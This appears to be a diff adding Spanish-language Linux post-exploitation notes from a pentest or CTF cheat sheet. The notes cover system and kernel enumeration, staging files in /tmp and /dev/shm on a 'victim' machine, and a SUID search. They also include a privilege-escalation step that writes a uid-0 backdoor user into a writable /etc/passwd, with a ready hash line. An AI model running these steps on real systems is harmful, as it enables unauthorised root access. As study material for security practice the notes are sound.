@@ -1,0 +1,24 @@
+Para enumerar el sistema operativo
+        lsb_release -a
+        cat /etc/os-release
+Para verificar el Path
+        echo $PATH
+Para ver las variables de entorno (puede haber contraseñas u informacion interesante)
+        env
+Para ver el kernel
+        uname -a
+        cat /proc/version
+Si deseamos enviar archivos a nuestra maquina ya comprometida, podemos hacerlo desde ftp, http, etc
+dado el caso es que no podemos descargar ficheros en cualquier parte de la maquina victima
+entre ficheros donde podamos leer, escribir y ejecutar (rwx) es en los siguientes directorios:
+        /dev/shm
+        /tmp/
+Si es que nos hemos logeado a un usuario entonces en su carpeta de trabajo es buena idea realizar la descarga
+
+
+Para buscar ficheros con el SUID entonces aplicar:
+        find / -perm -u=s 2>/dev/null
+en caso de que /etc/passwd tuviese permisos de escritura en grupos y otros entonces generaremos una contraseña con:
+        openssl passwd -6 -salt xyz password123
+tomamos la salida y posteriormente adicionamos nuestro nuevo usuario en /etc/passwd, ejemplo:
+        mago:$6$xyz$GwEUakmdX3DgVB1dG93Eht/N/JdxyMhuYoG3ZOkWj3P4OHCczVy6yEei5qZZmzhD3zTuFmD/UNiRYXCYJclTF.:0:0:pwned:/root:/bin/sh
